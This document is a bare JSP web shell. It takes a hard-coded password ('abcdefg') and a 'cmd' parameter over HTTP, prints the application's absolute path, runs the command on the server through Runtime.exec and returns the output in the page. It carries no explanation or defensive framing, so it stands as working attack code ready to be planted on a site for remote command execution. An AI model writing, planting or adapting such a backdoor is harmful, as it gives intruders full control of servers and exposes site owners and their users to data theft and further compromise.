<%@ page contentType="text/html; charset=GBK" language="java" buffer="32kb" %>
<%@ page import="java.lang.Runtime,java.io.*" %>
<%
    String pwd = request.getParameter("pwd");
    String cmd = request.getParameter("cmd");
    Runtime r = java.lang.Runtime.getRuntime(); 
    String output = "";
    if((pwd.equals("abcdefg")) && (cmd != null)) {
        out.println(this.getServletContext().getRealPath("/")); //The absolute path of the project
        String s = null;
        try {
            Process p = r.exec(cmd);
            BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while((s = sI.readLine()) != null) {
                output += s +"\r\n";
            }
        } catch(Exception e) {
            e.printStackTrace();
        }
    } else {
        out.println("");
    }
    out.println("<pre>"+output+"</pre>");
%>
